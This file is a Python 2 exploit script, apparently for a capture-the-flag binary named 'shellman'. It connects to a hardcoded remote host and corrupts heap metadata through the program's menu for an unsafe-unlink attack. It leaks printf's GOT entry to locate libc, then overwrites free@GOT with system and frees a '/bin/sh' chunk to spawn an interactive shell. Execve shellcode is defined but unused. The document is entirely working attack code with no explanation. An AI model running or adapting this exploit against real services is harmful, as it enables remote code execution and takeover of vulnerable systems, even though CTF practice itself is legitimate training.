#!/usr/bin/env python
#encoding:utf-8

import zio
from time import sleep

def NOPS(n):
    return 'B' * n

def LEFT_PAD(s, n):
    return NOPS(n - len(s)) + s

def RIGHT_PAD(s, n):
    return s + NOPS(n - len(s))

DELAY = 1
JMP06 = '\xeb\x06'
SHELLCODE = "j\x0bX\x991\xc9Rh//shh/bin\x89\xe3\xcd\x80"

def RAW_WITH_DELAY(s):
    sleep(DELAY)
    return str(s)

def NONE_WITH_DELAY(s):
    sleep(DELAY)
    return ''

TARGET = ('119.254.101.197', 10002)
GOT_PRINTF = 0x601618
GOT_FREE = 0x601600
LIBC_PRINTF = 0x54400
LIBC_SYSTEM = 0x46640
LIBC_BINSH = 0x17CCDB

# TARGET = ('10.211.55.32', 8888)
# TARGET = './shellman.b400c663a0ca53f1f6c6fcbf60defa8d'


def list_sc():
    global io
    io.writeline('1')

def new(size, buf=None):
    global io
    io.writelines(['2', str(size)])
    io.write(buf if buf else NOPS(size))

def edit(index, size=None, buf=None):
    global io
    if buf is None:
        io.writelines(['3', str(index), str(size)])
        io.write(NOPS(size))
    else:
        io.writelines(['3', str(index), str(len(buf))])
        io.write(buf)

def delete(index):
    global io
    io.writelines(['4', str(index)])


io = zio.zio(TARGET)

new(0x100) # id = 0
new(0x100) # id = 1
new(0x10) # id = 2
new(0x10) # id = 3
new(0x200) # id = 4

payload = zio.l64(0x100)
payload += zio.l64(0x100)
payload += zio.l64(0x6016C0 + 0x28 - 0x18)
payload += zio.l64(0x6016C0 + 0x28 - 0x10)
payload += zio.l64(0) * 2
edit(1, buf=payload)

# raw_input()
payload = NOPS(0x10)
payload += zio.l64(0x20 + 0x100)
payload += zio.l64(0x100)
payload += zio.l64(0) * 4
payload += NOPS(0x100 - 0x30)
payload += zio.l64(0x30)
payload += zio.l64(0x21)
payload += zio.l64(0) * 2
payload += zio.l64(0x20)
payload += zio.l64(0x21)
edit(2, buf=payload)

# raw_input()
delete(3)

edit(1, buf=zio.l64(GOT_PRINTF))
list_sc()
io.read_until('SHELLC0DE 0: ')
printf_addr = zio.l64(zio.UNHEX(io.read(16)))

libc_addr = printf_addr - LIBC_PRINTF
system_addr = libc_addr + LIBC_SYSTEM
binsh_addr = libc_addr + LIBC_BINSH

print hex(printf_addr)
print hex(system_addr)
print hex(binsh_addr)

edit(1, buf=zio.l64(GOT_FREE))
edit(0, buf=zio.l64(system_addr))
edit(1, buf=zio.l64(binsh_addr))
delete(0)

io.interact()

# raw_input()


# io.writelines(['2', '256', 'B' * 255])
# io.writelines(['2', '256', 'B' * 255])
# io.writelines(['3', '0', '288'])
# raw_input()
# io.write('B' * 264 + zio.l64(0x41) + zio.l64(0x6016C0 + 0x28 - 0x10) + zio.l64(0x6016C0 + 0x28 - 0x18))
# raw_input()
# io.writelines(['4', '0'])
# # io.writelines(['4', '1'])
# io.read_until_timeout()
